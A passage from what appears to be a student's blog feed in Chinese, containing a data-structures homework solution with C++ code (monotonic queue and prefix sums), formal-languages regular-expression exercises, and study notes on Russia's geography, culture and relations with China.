范围内的天数. 如此操作, 我们在查询时只需访问数组 <code>sum[i]</code>, 这实现了 $O(1)$ 的复杂度.</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><p>注意到 <code>p</code>, <code>q</code>, <code>m[i]</code> 的范围均为 $[1, 2^{32} - 1]$, 超过了 <code>int</code> 的范围, 因此使用 <code>long long</code> 数组存储.</p><p>若 <code>p = 0</code>, 则需直接返回低风险天数为 <code>0</code>; 若输入的 <code>p</code>、<code>q</code> 过大, 由于 <code>x[i]</code> 的范围为 $[1, 2\times 10^6]$, 在查询时应直接返回全部的风险天数. 这在代码中体现为使用 <code>flag</code> 记录最大单日确诊病例数的上界, 当超过此上界时, 直接返回 <code>sum[flag]</code>.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 54</span><span class="token comment">// 计算病例数位于 [0, p) 范围内的天数.</span>ans1 <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">&gt;</span> flag <span class="token operator">?</span> sum<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">:</span> sum<span class="token punctuation">[</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>     ans1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 计算病例数位于 [0, q) 范围内的天数.</span>ans2 <span class="token operator">=</span> <span class="token punctuation">(</span>q <span class="token operator">&gt;</span> flag <span class="token operator">?</span> sum<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">:</span> sum<span class="token punctuation">[</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> cout <span class="token operator">&lt;&lt;</span> ans1 <span class="token operator">&lt;&lt;</span> <span class="token char">' '</span> <span class="token operator">&lt;&lt;</span> ans2 <span class="token operator">-</span> ans1 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><p>算法时间复杂度主要来自计算最大单日确诊病例、计算前缀和与查询风险天数等部分:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token comment">// Line 30</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>que<span class="token punctuation">.</span>header <span class="token operator">&lt;=</span> que<span class="token punctuation">.</span>trailer <span class="token operator">&amp;&amp;</span> que<span class="token punctuation">.</span>val<span class="token punctuation">[</span>que<span class="token punctuation">.</span>trailer<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> x<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        que<span class="token punctuation">.</span>trailer<span class="token operator">--</span><span class="token punctuation">;</span>    que<span class="token punctuation">.</span>trailer<span class="token operator">++</span><span class="token punctuation">;</span>     que<span class="token punctuation">.</span>val<span class="token punctuation">[</span>que<span class="token punctuation">.</span>trailer<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    que<span class="token punctuation">.</span>pos<span class="token punctuation">[</span>que<span class="token punctuation">.</span>trailer<span class="token punctuation">]</span> <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>que<span class="token punctuation">.</span>pos<span class="token punctuation">[</span>que<span class="token punctuation">.</span>header<span class="token punctuation">]</span> <span class="token operator">&lt;</span> i <span class="token operator">-</span> m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>         que<span class="token punctuation">.</span>header<span class="token operator">++</span><span class="token punctuation">;</span>    cases<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> que<span class="token punctuation">.</span>val<span class="token punctuation">[</span>que<span class="token punctuation">.</span>header<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在计算最大单日确诊病例时, 每个元素最多入队且出队一次, 从而时间复杂度与输入元素数成正比, 为 $O(n)$;</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token comment">// Line 42</span><span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    flag <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>cases<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>    sum<span class="token punctuation">[</span>cases<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> flag<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    sum<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> sum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在进行前缀和计算时, 由于 <code>flag = max(x[i])</code>, 从而时间复杂度为 $O(n + max(x[i]))$;</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token comment">// Line 52</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> t<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    cin <span class="token operator">&gt;&gt;</span> p <span class="token operator">&gt;&gt;</span> q<span class="token punctuation">;</span>    ans1 <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">&gt;</span> flag <span class="token operator">?</span> sum<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">:</span> sum<span class="token punctuation">[</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>         ans1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ans2 <span class="token operator">=</span> <span class="token punctuation">(</span>q <span class="token operator">&gt;</span> flag <span class="token operator">?</span> sum<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">:</span> sum<span class="token punctuation">[</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> ans1 <span class="token operator">&lt;&lt;</span> <span class="token char">' '</span> <span class="token operator">&lt;&lt;</span> ans2 <span class="token operator">-</span> ans1 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在查询风险天数时, 每次查询用时常数时间, 从而时间复杂度与查询次数成正比, 为 $O(T)$;</p><p>综上, 算法总时间复杂度为 $O(n + max(x[i]) + T)$.</p><p>算法空间复杂度主要来自读取并存储数据的过程:</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 4</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAXLEN</span> <span class="token expression"><span class="token number">1000000</span></span></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 8</span><span class="token keyword">class</span> <span class="token class-name">PriorityQueue</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> header <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> trailer <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> pos<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> val<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 18</span><span class="token keyword">int</span> x<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> m<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> cases<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token keyword">int</span> sum<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>PriorityQueue que<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码开辟了定长的数组用于存储相关数据, 算法的空间复杂度约为: $8B\times 2\times 10^6 + 4B \times 5\times 10^6 = 36000KB$.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/10/16/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-1/"/>
      <url>/2022/10/16/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-1/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业2</title>
      <link href="/2022/10/15/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-2/"/>
      <url>/2022/10/15/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-2/</url>
      
        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-3-1-1-b"><a href="#Ex-3-1-1-b" class="headerlink" title="Ex 3.1.1 (b)"></a>Ex 3.1.1 (b)</h3><p>​    一个符合要求的正则表达式是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            \boldsymbol{(0 + 1)^*1(0 + 1)^9.}</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><h3 id="Ex-3-1-1-c"><a href="#Ex-3-1-1-c" class="headerlink" title="Ex 3.1.1 (c)"></a>Ex 3.1.1 (c)</h3><p>​    一个符合要求的正则表达式是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            \boldsymbol{(\varepsilon + 1)(00^<em>1)^</em>(\varepsilon + 1)(00^<em>1)^</em>0^*.}</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><h3 id="Ex-3-1-2-b"><a href="#Ex-3-1-2-b" class="headerlink" title="Ex 3.1.2 (b)"></a>Ex 3.1.2 (b)</h3><p>​    一个符合要求的正则表达式是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            \boldsymbol{(1^<em>01^</em>01^<em>01^</em>01^<em>0)^</em> + 1^*.}</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><h3 id="Ex-3-1-3-a"><a href="#Ex-3-1-3-a" class="headerlink" title="Ex 3.1.3 (a)"></a>Ex 3.1.3 (a)</h3><p>​    一个符合要求的正则表达式是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            \boldsymbol{0^<em>(1^</em>000^<em>)^</em>1^<em>0^</em>.}</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><h3 id="Ex-3-1-3-b"><a href="#Ex-3-1-3-b" class="headerlink" title="Ex 3.1.3 (b)"></a>Ex 3.1.3 (b)</h3><p>​    一个符合要求的正则表达式是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            \boldsymbol{(10 + 01)^*.}</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><h3 id="Ex-3-1-5"><a href="#Ex-3-1-5" class="headerlink" title="Ex 3.1.5"></a>Ex 3.1.5</h3><p>​    闭包有穷的两个语言分别为:</p><p>​    <script type="math/tex">\varnothing, \thinspace\left\{\varepsilon\right\}.</script></p><p>​    且</p><p>​    <script type="math/tex">\varnothing^* = \left\{\varepsilon\right\}^* = \left\{\varepsilon\right\}.</script></p><h3 id="Ex-3-4-1-c"><a href="#Ex-3-4-1-c" class="headerlink" title="Ex 3.4.1 (c)"></a>Ex 3.4.1 (c)</h3><p>​    将两个表达式具体化: </p><p>​    将 $R$ 替换为 $a$, 将 $S$ 替换为 $b$, 将 $T$ 替换为 $c$.</p><p>​    从而 $(RS)T$ 具体化为 $(ab)c$, $R(ST)$具体化为 $a(bc)$.</p><p>​    而 </p><p>​    <script type="math/tex">L((ab)c) = \left\{abc\right\} = L(a(bc)),</script></p><p>​    故原式成立.</p><h3 id="Ex-3-4-1-g"><a href="#Ex-3-4-1-g" class="headerlink" title="Ex 3.4.1 (g)"></a>Ex 3.4.1 (g)</h3><p>​    将两个表达式具体化: 将 $R$ 替换为 $a$, </p><p>​    从而 $(\varepsilon + R)^<em>$ 具体化为 $(\varepsilon + a)^</em>$, $R^<em>$具体化为 $a^</em>$.</p><p>​    注意到</p><p>​    <script type="math/tex">\left\{\varepsilon, a\right\}^* = \left\{\varepsilon, a, a^2, a^3, \cdots\right\} = \left\{a\right\}^*,</script></p><p>​    由此得</p><p>​    <script type="math/tex">L((\varepsilon + a)^*) = L(a^*).</script></p><p>​    故原式成立.</p><h3 id="Ex-3-4-2-b"><a href="#Ex-3-4-2-b" class="headerlink" title="Ex 3.4.2 (b)"></a>Ex 3.4.2 (b)</h3><p>​    将两个表达式具体化: </p><p>​    将 $R$ 替换为 $a$, 将 $S$ 替换为 $b$,</p><p>​    从而 $(RS + R)^<em>R$ 具体化为 $(ab + a)^</em>a$, </p><p>​    而$R(SR + R)^<em>$ 具体化为 $a(ba + a)^</em>$.</p><p>​    下证</p><p>​    <script type="math/tex">L((ab + a)^*a) = L(a(ba + a)^*).</script></p><p>​    归纳易得 $\forall\thinspace k\in\mathbb{N}$, 有</p><p>​    <script type="math/tex">\left\{ab, a\right\}^k\left\{a\right\} = \left\{a\right\}\left\{ba, a\right\}^k</script></p><p>​    进而由连接运算的分配律可知 </p><p>​    <script type="math/tex">L((ab+a)^*a) = \mathop{\bigcup}_{k\in\mathbb{N}}\left\{ab, a\right\}^k\left\{a\right\},</script></p><p>​    <script type="math/tex">L(a(ba+a)^*) = \mathop{\bigcup}_{k\in\mathbb{N}}\left\{a\right\}\left\{ab, a\right\}^k.</script></p><p>​    由此得</p><p>​    <script type="math/tex">L((ab + a)^*a) = L(a(ba + a)^*).</script></p><p>​    故原式成立.</p><h3 id="Ex-3-4-2-d"><a href="#Ex-3-4-2-d" class="headerlink" title="Ex 3.4.2 (d)"></a>Ex 3.4.2 (d)</h3><p>​    将两个表达式具体化: 将 $R$ 替换为 $a$, 将 $S$ 替换为 $b$,</p><p>​    从而 $(R + S)^<em>S$ 具体化为 $(a + b)^</em>b$, $(R^<em>S)^</em>$化为 $(a^<em>b)^</em>$.</p><p>​    注意到</p><p>​    <script type="math/tex">\varepsilon\in L((a^*b)^*), \thinspace\varepsilon\notin L((a + b)^*b)</script></p><p>​    从而</p><p>​    <script type="math/tex">L((a + b)^*b) \ne L((a^*b)^*).</script></p><p>​    故原式不成立.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>俄罗斯概况</title>
      <link href="/2022/10/09/e-luo-si-gai-kuang/"/>
      <url>/2022/10/09/e-luo-si-gai-kuang/</url>
      
        <content type="html"><![CDATA[<h1 id="俄罗斯概况"><a href="#俄罗斯概况" class="headerlink" title="俄罗斯概况"></a>俄罗斯概况</h1><h2 id="政治与经济"><a href="#政治与经济" class="headerlink" title="政治与经济"></a>政治与经济</h2><h3 id="国名"><a href="#国名" class="headerlink" title="国名"></a>国名</h3><ul><li>俄罗斯联邦(Российская Федерация), 俄罗斯(Россия)</li></ul><h3 id="国旗"><a href="#国旗" class="headerlink" title="国旗"></a>国旗</h3><ul><li>横长方形, 长与宽之比约为３∶２, 旗面自上而下分别为白、蓝、红三色. 俄罗斯幅员辽阔, 国土跨寒带、亚寒带和温带三个气候带, 用三色横长方形平行相连, 表示了俄罗斯地理位置上的这一特点.</li><li>白色代表寒带一年四季白雪茫茫的自然景观; 蓝色既代表亚寒带气候区, 又象征俄罗斯丰富的石油天然气和森林、水力等自然资源; 红色是温带的标志, 也象征俄罗斯历史的悠久和对人类文明的贡献.</li></ul><h3 id="国徽"><a href="#国徽" class="headerlink" title="国徽"></a>国徽</h3><ul><li>国徽为盾徽, 红色盾面上有一只金色的双头鹰, 鹰头上是彼得大帝的三顶皇冠; 鹰爪抓着象征皇权的权杖和金球, 鹰胸前是一个小盾形, 上面是一名骑士和一匹白马; 双头鹰一头望着西方, 另一头望着东方, 象征着两块大陆间的统一以及各民族的联合.</li></ul><h3 id="政体"><a href="#政体" class="headerlink" title="政体"></a>政体</h3><ul><li>俄罗斯实行总统制的联邦国家体制, 俄罗斯联邦总统是国家元首. 俄罗斯联邦会议是联邦的代表与立法机关, 联邦会议由联邦委员会(上院)和国家杜马(下院)两院组成; 国家杜马是俄罗斯的立法机构, 由450名代表组成, 每4年选举一次.</li></ul><h3 id="人口"><a href="#人口" class="headerlink" title="人口"></a>人口</h3><ul><li>全国有约1.42亿人口, 有130多个民族, 其中俄罗斯族人占82.95%, 人口分布极不均衡. 高加索地区的民族成分最为复杂, 有大约40个民族在此生活. 居民多信奉东正教, 其次为伊斯兰教.</li><li>俄语是俄罗斯联邦全境内的官方语言, 各共和国有权规定自己的国语, 并在该共和国境内可与俄语一起使用. 主要少数民族都有自己的语言和文字.</li></ul><h3 id="地理"><a href="#地理" class="headerlink" title="地理"></a>地理</h3><ul><li>面积1707.54万多平方公里, 是世界上领土面积最大的国家. 位于欧洲东部和亚洲北部, 其欧洲领土的大部分是东欧平原. </li><li>东濒太平洋, 西接波罗的海芬兰湾, 东西最长9000公里, 南北最宽4000公里, 海岸线长33807公里.</li><li>大部分地区处于北温带, 以大陆性气候为主, 温差普遍较大.</li></ul><h3 id="分界线"><a href="#分界线" class="headerlink" title="分界线"></a>分界线</h3><ul><li>俄罗斯亚欧大陆以乌拉尔山和乌拉尔河为界, 位于叶卡捷琳堡.</li></ul><h3 id="首都"><a href="#首都" class="headerlink" title="首都"></a>首都</h3><ul><li>莫斯科(Mocквa), 人口约850万, 1995年5月16日与北京市结为友好城市.</li></ul><h3 id="经济"><a href="#经济" class="headerlink" title="经济"></a>经济</h3><ul><li>天然气蕴藏量占世界探明储量的三分之一, 居世界第一位; 石油探明储量占世界探明储量的12%至13%; 煤蕴藏量居世界第二位. 丰富的资源为俄罗斯工农业发展提供了坚实的后盾.</li><li>俄工业基础雄厚, 部门齐全, 以机械、钢铁、冶金、石油、天然气、煤炭、森林工业及化工等为主.</li><li>俄农牧业并重, 主要农作物有小麦、大麦、燕麦、玉米、水稻和豆类, 畜牧业主要为养牛、养羊、养猪业.</li></ul><h2 id="文化与艺术"><a href="#文化与艺术" class="headerlink" title="文化与艺术"></a>文化与艺术</h2><h3 id="博物馆"><a href="#博物馆" class="headerlink" title="博物馆"></a>博物馆</h3><ul><li>俄罗斯的博物馆按专业可分为革命历史博物馆、历史博物馆、艺术博物馆、各专业博物馆以及其他博物馆等. 大型革命历史博物馆有俄罗斯中央革命博物馆、国家历史博物馆、克里姆林宫博物馆、中央海军博物馆等. 莫斯科被称为博物馆的城市, 最为著名的艺术馆有莫斯科特列季亚科夫画廊(国家绘画陈列馆).</li></ul><h3 id="风俗"><a href="#风俗" class="headerlink" title="风俗"></a>风俗</h3><ul><li>俄罗斯人交际时通常在三种情况下使用”你”:<ul><li>对16岁以下的儿童</li><li>近亲之间与同事之间</li><li>年轻人对年轻人 </li></ul></li><li>对老年人、陌生人和领导人称”您”.</li><li>对儿童可直呼其名, 而对老年人、陌生人和领导人则应呼其名字加父称.</li><li>在商业机构、新闻媒体和官方机构中人们习惯相互称”先生”; “同志”在国营企业、军队、公安部门使用; 而”公民”通常在公共场所使用; 在公开发言时, 一般在发言人的姓后面加上”先生”、”同志”或其相应职称”教授”、”工程师”等.</li></ul><h3 id="普希金"><a href="#普希金" class="headerlink" title="普希金"></a>普希金</h3><ul><li>俄国最伟大的诗人, 浪漫主义文学的杰出代表, 现实主义文学的奠基人, 现代俄语标准语的创始人, 他的作品是俄国民族意识高涨以及贵族革命运动在文学上的反映. 1837年2月, 普希金在彼得堡因决斗腹部受重伤去世.</li><li>有政治抒情诗《致恰达耶夫》(1818)、《自由颂》(1817)、《致西伯利亚的囚徒》(1827); 也有大量爱情诗和田园诗《我记得那美妙的一瞬》(1825)、《假如生活欺骗了你》(1825)、《我曾爱过您》(1829) 和《我又重新造访》(1835)等. 普希金一生创作了12部叙事长诗, 最主要的是《鲁斯兰和柳德米拉》、《高加索的俘虏》(1822)、《青铜骑士》(1833)等. 他的作品是“反映俄国社会的一面镜子”.</li></ul><h3 id="托尔斯泰"><a href="#托尔斯泰" class="headerlink" title="托尔斯泰"></a>托尔斯泰</h3><ul><li>俄国著名作家, 出身于贵族家庭, 1844年入喀山大学东方语文系和法律系学习, 1851年参军, 参加过克里木战争. 主要作品有《战争与和平》(1869)、《安娜·卡列尼娜》(1877)、《复活》(1899)等. 晚年放弃贵族特权和财产, 过着平民生活. </li></ul><h3 id="柴可夫斯基"><a href="#柴可夫斯基" class="headerlink" title="柴可夫斯基"></a>柴可夫斯基</h3><ul><li>俄罗斯历史上最伟大的作曲家, 俄罗斯民族音乐与西欧古典音乐的集大成者. 他的音乐基调建立在民歌和民间舞蹈的基础上, 乐曲中呈现出浓烈的生活气息和民间特色. 他的作品是现实主义和浪漫主义结合的典范. </li><li>有歌剧《叶甫根尼·奥涅金》、《黑桃皇后》等, 芭蕾舞剧《天鹅湖》、《睡美人》, 交响曲《第四交响曲》、《第五交响曲》以及交响诗《罗密欧与朱丽叶》等. </li></ul><h3 id="美术、戏剧及工艺品"><a href="#美术、戏剧及工艺品" class="headerlink" title="美术、戏剧及工艺品"></a>美术、戏剧及工艺品</h3><ul><li>俄罗斯的美术源远流长, 著名的艺术大师有列维坦、列宾、苏里柯夫、克拉姆斯科伊等. 俄罗斯的宗教音乐和民间音乐有着深远的历史传统, 歌剧、交响乐和室内音乐具有鲜明的民族气质, 奔放豪迈. </li><li>俄罗斯的戏剧艺术体裁和形式多样, 最早出现在宫廷里, 19世纪进入繁荣时期. 果戈理的《钦差大臣》等社会戏剧充满强烈的时代气息, 具有鲜明的民族特色; 亚·尼·奥斯特罗夫斯基是19世纪50年代以后俄罗斯文坛众多的戏剧作家中最杰出的代表, 被称为“俄罗斯戏剧之父”. </li><li>俄罗斯的马戏团在俄罗斯也很受人们的欢迎, 马戏团团员训练有素, 技艺精湛. </li><li>俄罗斯最有名的工艺品有木制套娃、木刻勺、木盒、木盘等木制品.  </li></ul><h3 id="名胜古迹"><a href="#名胜古迹" class="headerlink" title="名胜古迹"></a>名胜古迹</h3><ul><li>莫斯科<ul><li>克里姆林宫</li><li>红场</li><li>列宁墓</li><li>莫斯科河</li><li>凯旋门</li><li>俄罗斯大剧院</li></ul></li><li>圣彼得堡<ul><li>青铜骑士</li><li>涅瓦大街</li><li>桥的城市</li><li>“白夜”</li><li>彼得大帝夏宫</li><li>东宫</li><li>“阿芙乐尔号”巡洋舰</li></ul></li></ul><h3 id="莫斯科地铁"><a href="#莫斯科地铁" class="headerlink" title="莫斯科地铁"></a>莫斯科地铁</h3><ul><li>莫斯科地铁(Moscow Metro)是世界上规模最大的地铁之一, 被公认为世界上最漂亮的地铁, 享有“地下的艺术殿堂”之美称. </li><li>1935年5月15日, 苏联政府正式开通莫斯科地铁, 其建设工程耗时仅3年. 如今, 莫斯科地铁全长220多公里, 其布局与地面的布局一致, 呈辐射及环行线路. </li><li>地铁运行速度很快, 时速最高达90公里. 地铁站的建筑造型各异、华丽典雅, 广泛采用大理石、马赛克、花岗石、陶瓷和五彩玻璃, 装饰出具有不同艺术风格的大型壁画及各种浮雕、雕刻. 地铁站除根据民族特点建造外, 还以名人、历史事迹、政治事件为主题而建造.   </li></ul><h2 id="外交与语言"><a href="#外交与语言" class="headerlink" title="外交与语言"></a>外交与语言</h2><h3 id="建交"><a href="#建交" class="headerlink" title="建交"></a>建交</h3><ul><li>1949年10月2日, 中国与苏联建交. </li><li>1991年12月27日, 中俄两国在莫斯科签署《会谈纪要》, 正式建立两国国家关系.</li><li>2004年10月, 中俄两国发表联合声明并签署了《中华人民共和国和俄罗斯联邦关于中俄国界东段的补充协定》, 这一协定的签署标志着中俄边界线走向全部确定. </li><li>2005年6月2日, 中国和俄罗斯在符拉迪沃斯托克互换《中华人民共和国和俄罗斯联邦关于中俄国界东段的补充协定》批准书, 这标志着两国彻底解决了所有历史遗留的边界问题.</li></ul><h3 id="重要年份"><a href="#重要年份" class="headerlink" title="重要年份"></a>重要年份</h3><ul><li>2006 - 中国的俄罗斯年</li><li>2007 - 俄罗斯的中国年</li><li>2009 - 中国的俄语年</li><li>2010 - 俄罗斯的汉语年 </li><li>2013 - 中俄国家旅游年</li><li>2014 - 中俄青年友好交流年</li><li>2015 - 中俄媒体交流年</li><li>2019 - 戏剧年</li><li>2020 - 中俄科技创新年</li><li>2021 - “中俄睦邻友好合作条约”签署20周年</li><li>2022 - 中俄体育交流年</li></ul><h3 id="俄语"><a href="#俄语" class="headerlink" title="俄语"></a>俄语</h3><ul><li>俄语属于印欧语系、斯拉夫语族、东斯拉夫语支, 它是联合国六大工作语言之一(汉、英、法、俄、西、阿). </li><li>俄语字母由33个字母组成, 包含10个元音、21个辅音和2个无音字母. </li><li>俄语字母有大写和小写, 分为印刷体和手写体. </li><li>全世界有近三亿人用俄语作为母语进行交流, 有六分之一的出版物用俄语出版. </li></ul>]]></content>
      
      
      <categories>
          
          <category> Russian </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Russian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 作业2</title>
      <link href="/2022/10/06/ji-suan-ji-xi-tong-gai-lun-zuo-ye-2/"/>
